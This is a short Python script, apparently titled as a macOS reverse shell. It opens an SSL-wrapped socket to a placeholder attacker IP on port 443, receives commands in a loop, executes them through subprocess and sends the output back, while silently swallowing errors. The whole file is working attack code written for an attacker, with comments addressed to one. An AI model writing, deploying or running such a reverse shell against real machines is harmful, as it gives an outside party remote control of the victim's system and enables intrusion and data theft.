# mac_revshell.py
import socket
import ssl
import subprocess

# Replace with your attacker's IP address
ATTACKER_IP = "YOUR_ATTACKER_IP"
ATTACKER_PORT = 443  # Port for the reverse shell connection

def connect():
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Wrap socket with SSL
    wrapped_socket = ssl.wrap_socket(sock)

    try:
        # Connect to the attacker's machine
        wrapped_socket.connect((ATTACKER_IP, ATTACKER_PORT))

        while True:
            # Receive a command from the attacker
            command = wrapped_socket.recv(1024).decode("utf-8")

            if command.lower() == "exit":
                break

            # Execute the received command
            output = subprocess.getoutput(command)

            # Send the output back to the attacker
            wrapped_socket.send(output.encode("utf-8"))

    except Exception:
        pass
    finally:
        wrapped_socket.close()
